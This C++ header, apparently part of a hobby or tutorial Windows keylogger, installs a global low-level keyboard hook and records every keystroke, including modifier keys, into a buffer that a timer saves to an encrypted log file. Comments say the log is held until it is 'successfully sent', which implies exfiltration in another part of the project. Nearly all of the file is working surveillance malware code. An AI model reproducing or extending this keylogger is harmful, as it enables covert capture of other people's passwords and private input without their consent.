#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "IO.h"

HHOOK eHook = NULL; // this is a pointer to our hook

std::string keylog = ""; //if data is succeffuly send then the value keylog will be cleared otherwise it will on storing value untill it is succefully send

//open file in append mode

void SaveLog()
{
    if (keylog.empty()) //checks if the keylog is emply or not
        return;
    std::string last_file = IO::WriteLog(keylog); // if key log is not empty encrypt it

    if (last_file.empty()) //if encryption fail
    {
        Helper::WriteAppLog("File creation was not successfull. Keylog '" + keylog + "'");
        return;
    }
    keylog = "";
}

Timer LogTimer(SaveLog);

// This is our main function, it will be called by our system everytime by the system shen a keyboad key is pressed and
//This function can also restric the functionalty of some key
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) //LRESULT,WPARAM and LPARAM are part of windows API
{
    //If we receive nCode less than 0, this means we should propagate the HOOK onwards
    if (nCode < 0)
        CallNextHookEx(eHook, nCode, wparam, lparam); //wparam is the key type and lparam is KBWLLHOOKSTRUCT type <--refer_internet-->
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam; //casted through pointer
    //KBDLLHOOKSTRUCT contains info about a low-level keyboard input event

    // the action is valid: HC_ACTION.
    if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) //we will be able to check if someone is holding a key, basically for checking if keys like CTRl, SHIFT , ALT etc. keys are pressed
    {
        keylog += Keys::KEYS[kbs->vkCode].Name;
        if (kbs->vkCode == VK_RETURN)
            keylog += '\n';
    }

    else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) //if key is released or state is up
    {
        //idea is to print the system keys(ctrl,shift etc.) in html type format
        // eg. [SHIFT] [a][b][c][/SHIFT]
        DWORD key = kbs->vkCode;
        if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT || key == VK_RSHIFT || key == VK_LSHIFT || key == VK_RMENU || key == VK_LMENU || key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN)
        {
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
            KeyName.insert(1, "/");
            keylog += KeyName;
        }
    }
    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

void InstallHook()
{
    // Set the hook and set it to use the callback function above
    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
    // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
    // function that sets and releases the hook.
    Helper::WriteAppLog("Hook Started... Timer started");
    LogTimer.Start(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0); //WH_KEYBOARD_LL : this means we will use keyboard hook and LL is short hand for Low level, OurKeyboardProc: This is a procedure that will be invoked by hooked system everytime a user presses a key <--use_internet-->
}

void UninstallHook()
{
    LogTimer.Stop();
    UnhookWindowsHookEx(eHook);
}

#endif